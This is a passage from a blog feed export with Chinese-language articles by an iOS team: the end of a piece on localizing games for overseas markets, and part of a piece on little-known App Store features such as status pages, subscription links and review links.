1911</span></span><br></pre></td></tr></table></figure><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3f6b59e1c567413aae27318d364387bc~tplv-k3u1fbpfcp-watermark.image" alt="page-0057.jpg"></p><p>另外，2019年台湾推出新版的身份证时没”国旗”，这个东西，还是比较敏感，咱们就不多说了。最终，改为了上图右边的样式。</p><p><strong>日本年号</strong></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b696c47956a4457e9222e8faeac53bea~tplv-k3u1fbpfcp-watermark.image" alt="page-0058.jpg"></p><p>日本年号类似台湾的「民国」纪元，是日本长久以来的传统。不一样的是，日本的年号会更改，意味着所有官方、企业文件每次换年号时，所有的资料都要重做，牵连甚广。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5899c1bae430414cb612c1a6caf9f8aa~tplv-k3u1fbpfcp-watermark.image" alt="page-0059.jpg"></p><p>在 2019 年时，日本年号从 <code>平成</code> 改为 <code>令和</code>，作为全球唯一保留了年号和皇历的国家，尽管日本在日常生活中也普遍使用公历，但无论是银行、证券、保险等金融机构还是行政机关，都仍在使用年号纪元。当时影响也非常大。</p><p>“年号不过是一个名字而已，会造成这么大的影响吗？”</p><p>举例来说：平成 29 年发放的驾照有效期至平成32年（2020年），然而在这个日期来临前日本就已经进入了令和时期，理论上平成 32 年是不存在的。计算机的数据和人工的表格，都需要一一映射。</p><h4 id="4-4-货币"><a href="#4-4-货币" class="headerlink" title="4.4 货币"></a>4.4 货币</h4><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/aa9d04906c704714aad53f3139b1ff40~tplv-k3u1fbpfcp-watermark.image" alt="page-0060.jpg"></p><p>“$”一定是美元吗？</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4acbd4453fd74b1b91ad23de900473ef~tplv-k3u1fbpfcp-watermark.image" alt="page-0061.jpg"></p><p>“$” dollar 使用的国家或地区：</p><ul><li>港币： HongKong dollar</li><li>台币： New Taiwan dollar</li><li>新西兰元： New Zealand dollar</li><li>澳元： Australian Dollar</li><li>新币（新加坡币）： Singapore dollar</li><li>加元（加拿大元）： Canadian dollar</li></ul><h4 id="4-5-其它"><a href="#4-5-其它" class="headerlink" title="4.5 其它"></a>4.5 其它</h4><p><strong>海外服务</strong></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7e49bbb3432c4e41ba66f910b76db718~tplv-k3u1fbpfcp-watermark.image" alt="page-0062.jpg"></p><p>海外的技术服务提供商很多，这里就不一一列出。其中 Firebase 和亚马逊 AWS 接触的比较多，国内的腾讯云和阿里云，也一直在国际化部署，在很多国家或地区都有服务器。一般选择用国内服务，是因为都是自己人，遇到问题处理比较快，或者与国内技术栈一样，开发和接入成本低。</p><p><strong>制约因素</strong>  —— 地域性差异</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5bb5ab23288e444ca97f387646b87cea~tplv-k3u1fbpfcp-watermark.image" alt="page-0063.jpg"></p><p>关于本地化的内容就说到这里，还有很多细节的内容，需要大家去分析和理解。当然，出海肯定是需要找相关了解对应国家的人才，只有了解更多，才会走的更顺。</p><h3 id="五、一些踩过的“坑”"><a href="#五、一些踩过的“坑”" class="headerlink" title="五、一些踩过的“坑”"></a>五、一些踩过的“坑”</h3><p>我们在出海时，一定要充足了解和尊重本地文化，避免酿成大错！</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fce63e6f9649428ebf5c58545e864ee2~tplv-k3u1fbpfcp-watermark.image" alt="page-0064.jpg"></p><h4 id="5-1-慎用语言翻译工具"><a href="#5-1-慎用语言翻译工具" class="headerlink" title="5.1 慎用语言翻译工具"></a>5.1 慎用语言翻译工具</h4><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ef79258a9f5d483ea5ed6091fa7fbfe3~tplv-k3u1fbpfcp-watermark.image" alt="page-0065.jpg"></p><p>一般翻译工具，用在别人给我们发的其它语言，翻译成中文理解，这是没有问题。但是，如果我们需要翻译成对应国家或地区的语言时，慎用翻译工具。否则，很容量因为翻译错误，导致语句含义变更，本来是中性词，可能被翻译成了贬义词。比如 <code>大哥</code>，如果没有上下文，翻译就很容易错。</p><h4 id="5-2-没有绝对的自由"><a href="#5-2-没有绝对的自由" class="headerlink" title="5.2 没有绝对的自由"></a>5.2 没有绝对的自由</h4><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2477de345af54edeb3409c9f11f81c9f~tplv-k3u1fbpfcp-watermark.image" alt="page-0066.jpg"></p><p>自由是相对的，大家应该可以理解，这里不展开了。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f0425781be3c4b27af54702e8cb8ff46~tplv-k3u1fbpfcp-watermark.image" alt="page-0067.jpg"></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f1ace2cdf307445686f19244f401fb1c~tplv-k3u1fbpfcp-watermark.image" alt="page-0068.jpg"></p><h4 id="5-3-不要直接搬用国内经验做判断"><a href="#5-3-不要直接搬用国内经验做判断" class="headerlink" title="5.3 不要直接搬用国内经验做判断"></a>5.3 不要直接搬用国内经验做判断</h4><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/75cccb42f43d4ef1bbfdf84022991774~tplv-k3u1fbpfcp-watermark.image" alt="page-0069.jpg"></p><p>中国内地有内地的规则和法律，出海后，也要遵守海外的法律和习俗等，千万不要以为国内没有看到过，海外就直接搬来用。</p><h4 id="5-4-出海避坑指南"><a href="#5-4-出海避坑指南" class="headerlink" title="5.4 出海避坑指南"></a>5.4 出海避坑指南</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/85f46466417b45d9b2852a295008bfad~tplv-k3u1fbpfcp-watermark.image" alt="page-0070.jpg"></p><p>最后，如果大家对出海游戏有兴趣，可以关注这几个公众号，了解更多的资讯。</p><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>关于游戏，不管是蓝海还是红海，大家都在用不断的尝试：</p><ul><li>精细化运营</li><li>以玩家为本</li><li>电竞和直播</li><li>放眼全球国际化</li></ul><p>最后，关于游戏出海。不管是国内，还是国外，都在关注一个问题：<code>游戏是什么？</code></p><p>大家可以想一下，你认为的游戏是什么？</p><p>游戏就是游戏，大家可能已经把游戏当成一个单独的品类了，其实不然。</p><h4 id="6-1-游戏是什么"><a href="#6-1-游戏是什么" class="headerlink" title="6.1 游戏是什么"></a>6.1 游戏是什么</h4><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/928c1f9f87f64975b08b8c105d10800f~tplv-k3u1fbpfcp-watermark.image" alt="page-0071.jpg"></p><p>从国家新闻出版总署可以看到，游戏像图书、报纸、期刊等，是一个作品，供公众浏览、阅读、使用或下载等。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/670a28a6fc964a27bf5cf9ec70d54a9b~tplv-k3u1fbpfcp-watermark.image" alt="page-0072.jpg"></p><p>现在，大家对游戏的讨论很激烈，其实，在海外也一样，每个国家或地区，对于游戏的定义都不一样，并且会随着时间发生变化。</p><p>欢迎大家把自己对游戏的理解，评论区一起分享交流啊~</p><p>Thanks~</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ba96a93bda7342798a8fa63f4d7687e8~tplv-k3u1fbpfcp-watermark.image" alt="page-0073.jpg"></p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h3><ul><li><a href="http://www.jjckb.cn/2021-08/03/c_1310105032.htm">经参调查·锐度｜网络游戏长成数千亿产业 _ 经济参考网 _ 新华社《经济参考报》官方网站</a></li><li><a href="http://www.cac.gov.cn/2021-07/21/c_1628455293580107.htm">中央网信办启动“清朗·暑期未成年人网络环境整治”专项行动-中共中央网络安全和信息化委员会办公室</a></li><li><a href="http://www.nppa.gov.cn/nppa/contents/279/98792.shtml">国家新闻出版署-通知公示-国家新闻出版署关于进一步严格管理 切实防止未成年人沉迷网络游戏的通知</a></li><li><a href="http://politics.people.com.cn/n1/2021/0909/c1001-32221841.html">约谈腾讯、网易等游戏企业和平台–时政–人民网</a></li><li><a href="https://mp.weixin.qq.com/s/gZBa8cRH21tRoAZiS5pVhg">三七互娱：重构原有用户体系 严格落实未成年人网络游戏防沉迷规定</a></li><li><a href="https://mp.weixin.qq.com/s/65RUvnhl4HzOHhEk9Lgz4Q">腾讯推出游戏未保“双减双打”新措施</a></li><li><a href="https://api.academy.163.com/schoolNews/newsDetail?id=416">网易游戏启动暑期青少年网络环境整治行动，为未成年人绿色上网保驾护航</a></li><li><a href="http://www.mofcom.gov.cn/article/h/redht/202107/20210703180727.shtml">关于公示2021-2022年度国家文化出口重点企业和重点项目名单的通知</a></li><li><a href="https://www.apple.com.cn/newsroom/2021/08/apple-us-developers-agree-to-app-store-updates/">Apple 与美国开发者就 App Store 更新达成一致 - Apple (中国大陆)</a></li><li><a href="https://www.apple.com.cn/newsroom/2021/09/japan-fair-trade-commission-closes-app-store-investigation/">日本公平贸易委员会结束对 App Store 的调查 - Apple (中国大陆)</a></li><li><a href="https://page.om.qq.com/page/OFf0ha7QUvQzD_LP-U0lF2Yg0">媒体热评Epic诉苹果案： 苹果每年或损失数十亿美元 但对苹果业务影响不大</a></li><li><a href="https://likms.assembly.go.kr/bill/billDetail.do?billId=PRC_E2Z1F0E7F2Y0Q1S1N3B4Y5U2A2K2P9&ageFrom=21&ageTo=21">[2112203] 전기통신사업법 일부개정법률안(대안)(과학기술정보방송통신위원장)</a></li><li><a href="https://opinion.lawmaking.go.kr/gcom/nsmLmSts/out/2112203/detailRP">(국회·정부)입법현황 ㅣ 국회입법현황 ㅣ 입법정보</a></li><li><a href="https://www.theverge.com/2021/9/10/22662320/epic-apple-ruling-injunction-judge-court-app-store">Apple must allow other forms of in-app purchase, rules judge in Epic v. Apple - The Verge</a></li><li><a href="https://mp.weixin.qq.com/s/xEqxL5jsqgCu-QODdNH25g">关于昨天引发行业关注的韩国立法强制谷歌开放三方支付这件事，我们高兴的有点早</a></li><li><a href="http://www.nppa.gov.cn/nppa/channels/317.shtml">国家新闻出版署-游戏审批结果</a></li><li><a href="https://www.jiemian.com/article/4282127.html">“文网文”已停摆1年，游戏企业运营资质将何去何从|界面新闻</a></li><li><a href="https://www.zhihu.com/question/35655983">什么是游戏版号？ - 知乎</a></li><li><a href="https://xueqiu.com/1758860965/193106875">国家会对游戏公司下手吗？- 雪球</a></li><li><a href="https://www.ccopyright.com.cn/index.php?optionid=1033">计算机软件著作权登记指南-中国版权保护中心</a></li><li><a href="http://www.gov.cn/gongbao/content/2017/content_5240090.htm">中华人民共和国工业和信息化部令（第42号）电信业务经营许可管理办法_2017年第32号国务院公报_中国政府网</a></li><li><a href="http://www.gov.cn/zhengce/zhengceku/2019-12/02/content_5457656.htm">文化和旅游部关于废止《网络游戏管理暂行办法》和《旅游发展规划管理办法》的决定_文化_中国政府网</a></li><li><a href="https://zhuanlan.zhihu.com/p/78981955">《网络游戏管理暂行办法》已废止，游戏运营企业是否可以裸奔？！ - 知乎</a></li><li><a href="https://www.thepaper.cn/newsDetail_forward_8624260">版号政策下的游戏江湖：腾讯网易也只能苦等_美数课_澎湃新闻-The Paper</a></li><li><a href="https://www.thepaper.cn/newsDetail_forward_12123646">去东南亚“收割”2亿爱玩游戏的年轻人_湃客_澎湃新闻-The Paper</a></li><li><a href="http://www.21jingji.com/2021/5-29/3NMDE1MTFfMTYyNDk3NA.html">东南亚人口红利调查：七国劳动力占比持续上升 制造业工人“年轻且薪水低” - 21经济网</a></li><li><a href="https://mp.weixin.qq.com/s/1cZ033an5xi50tYgIqM7zQ">【出海干货】越南：全球最具活力的移动游戏市场之一</a></li><li><a href="https://www.ithome.com/0/552/517.htm">SensorTower：一季度美国手游市场收入 61 亿美元，中国手游占 24% - IT之家</a></li><li><a href="https://www.letsgojp.cn/archives/372595/">日本新年号「令和」终於公布！平成的下一个年号怎么选出来的告诉你-乐吃购日本</a></li><li><a href="https://tech.ifeng.com/c/7mMvXe6e4T0">为什么改元“令和”，竟然成了日本程序员的魔咒？_凤凰网</a></li><li><a href="https://zh.wikipedia.org/wiki/%E6%97%A5%E6%9C%AC%E5%8E%86%E5%8F%B2%E5%B9%B4%E8%A1%A8">日本历史年表 - 维基百科，自由的百科全书</a></li><li><a href="https://coinyep.com/zh/currencies">世界货币符号,世界货币符号 | CoinYEP</a></li><li><a href="https://mp.weixin.qq.com/s/a3CO_ykheqdIU6q8xA15Pw">广州游戏公司转型中的忧患与现实</a></li><li><a href="https://mp.weixin.qq.com/s/MjlS_8piDrUfcoGRqKgr7w">莉莉丝在北京的这个50人团队，为他们打下了日韩市场！｜游戏鹰眼</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发于 &lt;a href=&quot;https://blog.csdn.net/iOSTeam37/article/details/120294727&quot;&gt;游戏出海本地化概述 - CSDN&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="中国游戏" scheme="https://ihtcboy.com/tags/%E4%B8%AD%E5%9B%BD%E6%B8%B8%E6%88%8F/"/>
    
    <category term="游戏出海" scheme="https://ihtcboy.com/tags/%E6%B8%B8%E6%88%8F%E5%87%BA%E6%B5%B7/"/>
    
    <category term="出海本地化" scheme="https://ihtcboy.com/tags/%E5%87%BA%E6%B5%B7%E6%9C%AC%E5%9C%B0%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>你一定不知道的 AppStore 秘密</title>
    <link href="https://ihtcboy.com/2021/08/03/2021-08-03_%E4%BD%A0%E4%B8%80%E5%AE%9A%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84AppStore%E7%A7%98%E5%AF%86/"/>
    <id>https://ihtcboy.com/2021/08/03/2021-08-03_%E4%BD%A0%E4%B8%80%E5%AE%9A%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84AppStore%E7%A7%98%E5%AF%86/</id>
    <published>2021-08-03T09:36:16.000Z</published>
    <updated>2022-02-13T10:43:24.501Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于 <a href="https://juejin.cn/post/6992134804997160996">你一定不知道的 AppStore 秘密 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>对于 iOS 开发者来说 App Store 是必经之路，大家一定多多少少都会有了解。但 App Store 的功能之多，并且每年都有更新，比如上一篇文章我们讲到 <a href="https://juejin.cn/post/6986478834040209445">《解读 AppStore 新功能：自定义产品页面和 A/B Test 工具》</a> ，所以本文对一些大家平时经常接触的功能，但可能忽视的一些细节进行解说，也会对一些平时大家很少接触的功能进行探索。可能不是最全的，但一定有你不知道的 App Store 秘密！</p><h3 id="二、AppStore-秘密"><a href="#二、AppStore-秘密" class="headerlink" title="二、AppStore 秘密"></a>二、AppStore 秘密</h3><blockquote><p>我们的 SDK 包含 250,000 个 API，为您在 app 中构建高级功能提供了无限的可能性。过去 4 年发布的 iPhone 设备中 92% 都在运行 iOS 13，因此您可以放心地利用最新技术来交付功能。</p><p>来源：<a href="https://developer.apple.com/cn/app-store/features/">App Store - Apple Developer</a></p></blockquote><ul><li>1 个生态系统。</li><li>5 个平台。</li><li>40 种语言。</li><li>175 个地区。</li><li>每周 5 亿访客。</li><li>15 亿台 Apple 设备。</li></ul><p>关于苹果 App Store 服务，大家最熟悉的包含有 App Store app、IAP(In App Purchase，应用内购买)、App 预订、App 评论搜索等。那么，我们一起来看看，有那些不为大家所知的秘密吧~</p><h4 id="2-1-系统状态"><a href="#2-1-系统状态" class="headerlink" title="2.1 系统状态"></a>2.1 系统状态</h4><p>比如上周五，苹果 App Store 出现故障，导致 <code>无法连接 App Store</code>，用户无法打开的问题：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4e0fc827c7714a09b161995dac06c23f~tplv-k3u1fbpfcp-watermark.image" alt="16278113027218.jpg"></p><p>针对以上这个情况，有没有办法可以提前预测呢？很遗憾告诉大家，目前苹果官方还没有提供实时的系统服务状态查询，在苹果官网的帮助可以查看到这样的 <a href="https://www.apple.com.cn/cn/support/systemstatus/">系统状态页面</a>：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0416136170374e4b979e50af2f10ec88~tplv-k3u1fbpfcp-watermark.image" alt="16278220480870.jpg"></p><p>从上图可以看到，<code>Apple Books</code> 和 <code>iTunes Store</code> 服务在 2016-04-26 时因一些不可抗拒的原因在中国内地中断至今。而 <code>Apple Pay &amp; Wallet</code> 钱包功能出现服务中断：</p><blockquote><p>2021-07-23 上午7:00 - 现在，部分用户受到影响，岭南通·羊城通的持卡人可能无法使用 Apple Pay 的部分功能。</p></blockquote><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1638d07944d04d808fbe7efefe59dbc4~tplv-k3u1fbpfcp-watermark.image" alt="16278279533989.jpg"></p><p>从这个服务中断就可以看出来，苹果的这个系统状态通知，并不是实时的公告，而是有延迟，有时候是修复后才出通知公告。</p><p>关于系统状态页面，不同地区是不同的链接，小编整理常见的列表：</p><table><thead><tr><th>国家/地区</th><th>语言代号</th><th>链接</th></tr></thead><tbody><tr><td>中国</td><td>zh_CN</td><td><a href="https://www.apple.com/cn/support/systemstatus/">https://www.apple.com/cn/support/systemstatus/</a></td></tr><tr><td>美国</td><td>en_US</td><td><a href="https://www.apple.com/support/systemstatus/">https://www.apple.com/support/systemstatus/</a></td></tr><tr><td>中国香港</td><td>zh_HK</td><td><a href="https://www.apple.com/hk/support/systemstatus/">https://www.apple.com/hk/support/systemstatus/</a></td></tr><tr><td>中国台湾</td><td>zh_TW</td><td><a href="https://www.apple.com/tw/support/systemstatus/">https://www.apple.com/tw/support/systemstatus/</a></td></tr><tr><td>韩国</td><td>ko_KR</td><td><a href="https://www.apple.com/kr/support/systemstatus/">https://www.apple.com/kr/support/systemstatus/</a></td></tr><tr><td>日本</td><td>ja_JP</td><td><a href="https://www.apple.com/jp/support/systemstatus/">https://www.apple.com/jp/support/systemstatus/</a></td></tr><tr><td>新加坡</td><td>en_SG</td><td><a href="https://www.apple.com/sg/support/systemstatus/">https://www.apple.com/sg/support/systemstatus/</a></td></tr><tr><td>俄罗斯</td><td>ru_RU</td><td><a href="https://www.apple.com/ru/support/systemstatus/">https://www.apple.com/ru/support/systemstatus/</a></td></tr><tr><td>德国</td><td>de_DE</td><td><a href="https://www.apple.com/de/support/systemstatus/">https://www.apple.com/de/support/systemstatus/</a></td></tr></tbody></table><p>从这里可以看到，每个国家或地区的链接中代码，那么这个语言代号可以从苹果 <a href="https://www.apple.com/choose-country-region/">Choose Your Country or Region</a> 网页的源代码中获取，这也是苹果目前支持的国家和地区。</p><p>以上是针对用户层面的服务，比如 App Store、iCloud 是否可用等，那么针对开发者来说，有没有苹果服务 API 的系统状态呢？其实也是有的。</p><p><strong>开发者系统状态</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/faa8556dd1d94e8f9eaa648c625a48cb~tplv-k3u1fbpfcp-watermark.image" alt="16278329122934.jpg"></p><p>从这个图片可出来，针对 App Store 的服务有很多，<code>App Store Connect</code>、<code>App Store Sandbox</code>、<code>App Store Server Notifications</code>、<code>In-App Purchases</code> 、<code>App Store Receipt Verification</code> 等，从而可以看出这个页面的信息非常的重要！当然，这个目前苹果官方也没有实现的通知。比如这个：</p><blockquote><p><strong>Resolved Outage</strong>（已解决的中断）<br>Today, 12:58 AM - 1:07 AM<br>Some users were affected<br>Affected Services: App Store Connect, App Store Connect API, TestFlight<br>Users experienced a problem with this service.</p></blockquote><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/23bf809873c34fac9346a5149ebfdfc6~tplv-k3u1fbpfcp-watermark.image" alt="16278329606100.jpg"></p><p>因为这些服务目前是针对开发者服务，目前还没有分国家或地区的服务器，统一用这个 <a href="https://developer.apple.com/system-status/">https://developer.apple.com/system-status/</a> 页面查看开发者系统状态。一般来说，当出现大面积的无法使用的服务时，可以通过查看状态确认是不是苹果服务器问题。比如，经常遇到苹果沙盒环境无法充值（<code>App Store Sandbox</code>）、线上用户无法充值（<code>In-App Purchases</code>、<code>App Store Receipt Verification</code>），只能说，遇到问题时怀疑是苹果的服务问题，可以看看这个页面。但这个页面也不时实时刷新，出现大面积的无法使用，依然是看看大家(同行)或者新闻的消息。</p><blockquote><p>注：为什么没有实时，我想是目前苹果的服务遍布全球，想要全盘实时通知，一方面是影响的时长，另一方面影响的范围，不是不可以，可能是需要时间？可以肯定苹果有内部系统报警，但如果遇到问题，马上通知开发者？评估影响时长和范围？还是应该马上修复？这里就不深入探讨，看看苹果未完待续。</p></blockquote><p>既然苹果这样，那么我们来对比一下谷歌，看看有没有不一样的发现？首先是 Google 产品和服务的流量和中断记录页面会显示：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5878dfde70c743148a64c3698747d732~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p><p>可以看到谷歌服务的中断情况，网页中还有按国家、地区的筛选条件，这里就不展开了，大家想了解可以看看啊。</p><p>而谷歌常见服务出现故障甚至宕机时，在 <a href="https://www.google.com/appsstatus/dashboard/">Google Workspace 状态信息中心</a> 页面可以查看：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6c6017823af342bcb766f15c3b8bc911~tplv-k3u1fbpfcp-watermark.image" alt="16278341226786.jpg"></p><p>页面底部有一个入口，<a href="https://www.google.com/appsstatus/dashboard/summary">Google Workspace 历史记录</a> 可以查看某个服务的中断时间，影响时长等。相对于苹果的服务来说，还提供 RSS 和 JSON 历史记录接口，甚至是 <a href="https://support.google.com/a/answer/139569?hl=zh-Hans">帮助文档</a>，显得更加完善和友好：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/91744f3a174d4d6881c3144fe3ab2c0a~tplv-k3u1fbpfcp-watermark.image" alt="16278343347470.jpg"></p><p>谷歌的系统状态查看服务有：<a href="https://www.google.com/appsstatus/dashboard/">Google Workspace</a>、<a href="https://status.cloud.google.com/">Google Cloud Status Dashboard</a>、<a href="https://status.firebase.google.com/">Firebase Status Dashboard</a>、<a href="https://ads.google.com/status/publisher/">Google Ads</a> 等，页面风格统一。Google Play Store 的系统状态，小编没有找到入口；而谷歌系统状态信息的实时性暂时没有相关资料，有懂的朋友，可以在评论区一起交流哈~</p><p>从网上资料看，谷歌服务出现故障的情况好像不多，毕业谷歌有商业化的云服务，出故障是不可能的？而苹果，一般是服微软和亚马逊的云服务，而在中国的 iCloud 服务是用云上贵州，其它的服务暂时还是统一服务器？</p><p>当然，关于实时性，也有第三方的服务监听苹果和谷歌的服务。比如 <a href="https://downdetector.com/">Downdetector</a>、<a href="https://downdetector.com/status/google-play/">Google Play not working? </a> 、<a href="https://statusgator.com/services/google-apps">Google Workspace Status</a> 。这里就不展开了，毕竟第三方也是监听，从最优方案当然是官方支持。</p><p>最后，一般做用户产品的 app 都会遇到用户反馈：<a href="https://support.apple.com/zh-cn/HT201400">如果您无法连接到 App Store、iTunes Store 或其他 Apple 服务</a>，但是文档是发生问题后的解决方案，能不能优化一下减少出问题呢?关于服务系统状态查询，它的目的是什么？肯定不是出问题后，给大家通告一下就完事吧，而应该是向更高实时性提高！加油吧苹果！</p><h4 id="2-2-App-订阅"><a href="#2-2-App-订阅" class="headerlink" title="2.2 App 订阅"></a>2.2 App 订阅</h4><p>苹果内购订阅是很常见的类型，比如音乐、视频类 app 的持续包月，以前可能用户在 app 里订阅后，以为是一次性或者想准备到期后在取消，然后就被自动扣费了。这一招现在支付宝和微信早就学会了。还有一个原因，是以前苹果的 App Store 账号管理在首页下滚到最底部，总之经过的步骤很复杂，一般小白用户很难找。</p><p>其实，关于管理 app 订阅，以前是可能通过 <code>https://buy.itunes.apple.com/WebObjects/MZFinance.woa/wa/manageSubscriptions</code> 链接打开 App Store 会自动显示用户的订阅信息界面，但一般开发者不会提供，甚至是开发者都不知道有这个链接。</p><p>现在，最新的 iOS 14 以后，App Store 用户账号很方便找到入口，在“帐户”，然后轻按“订阅”就可以管理订阅了。当然，如果开发者愿意引导用户打开订阅管理界面，可以用最新的这个苹果链接 <code>https://apple.co/2Th4vqI</code>。更多关于取消订阅可以参考 <a href="https://support.apple.com/zh-cn/HT202039">如何取消 Apple 提供的订阅</a> 文档。</p><p>最后，苹果在 WWDC21 推出了在 app 里管理用户订阅项目的界面，不用在跳转到 App Store，具体可以翻看之前的文章 <a href="https://juejin.cn/post/6974733392260644895">苹果内购 - WWDC21</a>。</p><h4 id="2-3-App-链接"><a href="#2-3-App-链接" class="headerlink" title="2.3 App 链接"></a>2.3 App 链接</h4><p>在 2019 年以前，苹果的 app 商店链接，一直都是 <code>itunes.apple.com</code>，举例来说是这样的：<code>https://itunes.apple.com/cn/app/斗罗大陆-魂师对决/id1558453472</code>。因为 <code>iTuens</code> 是苹果的音乐播放和管理的软件，iPhone 可以说是从 iPod 升级而来，关于 iTuens 这里就不多说，因为苹果已经弃用并且，并转移到 Apple Music 和 Apple 播客这两个 app 中，详细可以查看 <a href="https://www.apple.com.cn/itunes/">iTunes - Apple</a>。</p><p>2019年6月14号，苹果<a href="https://developer.apple.com/cn/news/?id=06142019a">宣布</a> AppStore 商店App下载地址从 <code>itunes.apple.com</code> 更换为 <code>apps.apple.com</code>。比如用 <code>https://itunes.apple.com/cn/app/斗罗大陆-魂师对决/id1558453472</code> 请求时，会自动跳转到 <code>https://apps.apple.com/cn/app/斗罗大陆-魂师对决/id1558453472</code>。所以大家建议用新的链接，减少页面跳转。</p><p>当然，这个链接里有一个 <code>cn</code> 这个是国家或地区的标识，这个标识跟前文提到的是一样的。如果你的应用只上中国内地，那么就用 <strong>cn</strong>，用其它的也不影响中国内地账号用户访问，而其它地区的用户账号访问时会提示：目前您所在国家或地区尚不提供此App。而如果是选择全球所有的地区都发布，那么用什么地区标识都可以打开。</p><p>更进一步，不带地区也是可以，比如：<code>https://apps.apple.com/app/斗罗大陆-魂师对决/id1558453472</code>，甚至带游戏名也不用带 <code>https://apps.apple.com/app/id1558453472</code>。不带这些参数的话，用电脑上打开显示 Connecting to the iTunes Store…，但是可以正常跳转到 App Store：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bf653e5355854ac983c4e2eaf43e3ee9~tplv-k3u1fbpfcp-watermark.image" alt="16279081060021.jpg"></p><p>带所有的参数时，会显示 App Store 预览页面：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2d5ac7b0cd244c4296379362de4bebfc~tplv-k3u1fbpfcp-watermark.image" alt="16279082639165.jpg"></p><p>所以，关于 App 链接，最好的链接格式，应该是这样：<code>https://apps.apple.com/cn/app/id1558453472</code>。带有地区和 apple id 标识就可以了，游戏名可以不需要带上。</p><p><strong>App Store 开发者页面</strong></p><p>那么有一个问题，app 可以通过链接跳转到 App Store，那么可能通过链接跳转到 App Store 的开发者界面吗？</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8f287656b9f54026b02995f84bb03e1b~tplv-k3u1fbpfcp-watermark.image" alt="16279654329857.jpg"></p><p>很显然是可以的！比如这个链接：<code>https://apps.apple.com/cn/developer/khorgas-zhifan-network-technology-co-ltd/id1540746184</code>，需要注意这个 <code>id1540746184</code> 是开发者账号的id，不是 app 的。那么问题来了，怎么获取这个开发者页面的链接呢?</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/530f6c7948c34b9fb06c05c0e1f298c6~tplv-k3u1fbpfcp-watermark.image" alt="16279656607309.jpg"></p><p>答案就是，在浏览器打开开发者的某个 app 的预览页面，然后开发者名字那一栏，就是开发者页面的链接，复制一下就可以啦~</p><h4 id="2-4-App-评论"><a href="#2-4-App-评论" class="headerlink" title="2.4 App 评论"></a>2.4 App 评论</h4><p>在所有的 iOS 版本中，通过 app 链接拼接 <code>action=write-review</code> 时，都可以跳转到 App Store 打开评估页面。比如 <code>https://apps.apple.com/cn/app/id1558453472?action=write-review</code> 。需要注意的是，如果用户从来没有下载过此 app，则跳转后会提示必须拥有此项目才能评论：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/86ae9da7eef34adf990fa67c78945d2f~tplv-k3u1fbpfcp-watermark.image" alt="16279099467349.jpg"></p><p>而在 iOS 10.3 以上，苹果提供了 app 内评论的功能，方法也很简单，调用苹果的 API 接口 <code>[SKStoreReviewController requestReview]</code> 就可以：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/de272be53d6c49e8845e00c99bd3c645~tplv-k3u1fbpfcp-watermark.image" alt="16279099688237.jpg"></p><p><strong>App内评分功能注意事项</strong></p><ul><li>仅支持 iOS 10.3+ 以上</li><li>评分弹窗是标准化，不提供自定义UI或控制评分功能</li><li>开发环境每次调用都会显示评分界面</li><li>TestFlight 